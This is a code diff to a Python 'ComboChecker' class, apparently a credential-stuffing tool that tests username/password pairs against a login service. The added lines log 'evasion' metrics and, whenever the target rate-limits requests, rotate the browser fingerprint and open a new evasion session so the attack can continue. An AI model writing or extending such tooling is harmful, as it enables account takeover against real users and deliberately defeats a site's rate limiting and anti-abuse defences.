@@ -488,6 +488,62 @@ class ComboChecker:
             logging.error(f"Failed to store session summary: {e}")
             db.session.rollback()
     
+    def _update_evasion_metrics(self, status_code: int, response_time: float):
+        """Update evasion performance metrics"""
+        with self.progress_lock:
+            if 'status_codes' not in self.session_stats['evasion_metrics']:
+                self.session_stats['evasion_metrics']['status_codes'] = {}
+            
+            status_key = str(status_code)
+            if status_key not in self.session_stats['evasion_metrics']['status_codes']:
+                self.session_stats['evasion_metrics']['status_codes'][status_key] = 0
+            
+            self.session_stats['evasion_metrics']['status_codes'][status_key] += 1
+            
+            # Track response times for evasion analysis
+            if 'evasion_response_times' not in self.session_stats['evasion_metrics']:
+                self.session_stats['evasion_metrics']['evasion_response_times'] = []
+            
+            self.session_stats['evasion_metrics']['evasion_response_times'].append(response_time)
+    
+    def _log_evasion_summary(self):
+        """Log comprehensive evasion session summary"""
+        metrics = self.session_stats.get('evasion_metrics', {})
+        
+        logging.info(f"=== Evasion Session Summary (ID: {self.session_id}) ===")
+        logging.info(f"Total requests: {self.request_count}")
+        logging.info(f"Fingerprint rotations: {self.session_stats.get('fingerprint_rotations', 0)}")
+        
+        if 'status_codes' in metrics:
+            logging.info("Status code distribution:")
+            for code, count in metrics['status_codes'].items():
+                logging.info(f"  {code}: {count} requests")
+        
+        if 'evasion_response_times' in metrics:
+            times = metrics['evasion_response_times']
+            if times:
+                avg_time = sum(times) / len(times)
+                logging.info(f"Average evasion response time: {avg_time:.2f}s")
+        
+        # Get current fingerprint info
+        if self.current_fingerprint:
+            logging.info(f"Final fingerprint: {self.current_fingerprint.user_agent[:60]}...")
+        
+        logging.info("=== End Evasion Summary ===")
+    
+    def get_evasion_status(self) -> Dict:
+        """Get current evasion status for API responses"""
+        return {
+            'current_fingerprint': {
+                'user_agent': self.current_fingerprint.user_agent if self.current_fingerprint else None,
+                'platform': self.current_fingerprint.platform if self.current_fingerprint else None,
+                'resolution': self.current_fingerprint.screen_resolution if self.current_fingerprint else None
+            },
+            'request_count': self.request_count,
+            'fingerprint_rotations': self.session_stats.get('fingerprint_rotations', 0),
+            'evasion_metrics': self.session_stats.get('evasion_metrics', {})
+        }
+    
     def _make_request(self, url: str, data: Dict) -> Optional[requests.Response]:
         """Make HTTP request with retry logic"""
         for attempt in range(MAX_RETRIES):
@@ -582,13 +638,18 @@ class ComboChecker:
         
         result = self.check_single_combo(username, password)
         
-        # Adaptive rate limiting based on response
+        # Adaptive rate limiting with evasion intelligence
         if result.get('status') == 'rate_limited':
             with self.progress_lock:
-                self.rate_limit_delay = min(self.rate_limit_delay * 1.5, 10.0)  # Increase delay, max 10s
+                self.rate_limit_delay = min(self.rate_limit_delay * 1.8, 15.0)  # More aggressive backoff
+                # Force fingerprint rotation on rate limit
+                if self.request_count > 5:
+                    self.current_fingerprint = evasion_engine.rotate_fingerprint()
+                    self.evasion_session = evasion_engine.create_evasion_session()
+                    self.session_stats['fingerprint_rotations'] += 1
         elif result.get('status') in ['valid', 'invalid']:
             with self.progress_lock:
-                self.rate_limit_delay = max(self.rate_limit_delay * 0.95, 0.5)  # Decrease delay, min 0.5s
+                self.rate_limit_delay = max(self.rate_limit_delay * 0.9, 1.0)  # Slower decrease, min 1.0s for safety
         
         # Track response times for statistics
         response_time = time.time() - start_request_time
